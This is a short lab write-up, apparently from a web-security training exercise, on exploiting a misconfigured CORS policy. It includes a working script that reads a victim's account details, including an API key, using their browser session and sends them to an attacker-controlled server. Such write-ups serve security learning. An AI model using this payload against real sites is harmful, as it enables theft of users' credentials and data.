# CORS Exploitation with Fetch

## Lab Context
This lab demonstrated a **misconfigured CORS policy**, where the application trusted all origins (`Access-Control-Allow-Origin: *`).  
Because of this, I was able to craft a malicious payload that used the victim’s browser session to fetch sensitive data from the API.

## Vulnerability Summary
- **Type**: Security Misconfiguration → Insecure CORS  
- **Impact**: Allowed an attacker to steal sensitive information (API key) from authenticated users.  
- **Root Cause**: The server blindly trusted all origins and allowed cross-origin requests with user credentials.

## Exploit Payload
I used the `fetch` API to request sensitive data from the victim’s 
endpoint and exfiltrate it to my controlled server.

```html
<script>
fetch("https://victim-site.web-security-academy.net/accountDetails", {
  credentials: "include"
})
  .then(r => r.text())
  .then(data => fetch("https://my-exploit-server.net/log?key=" + encodeURIComponent(data)));
</script>
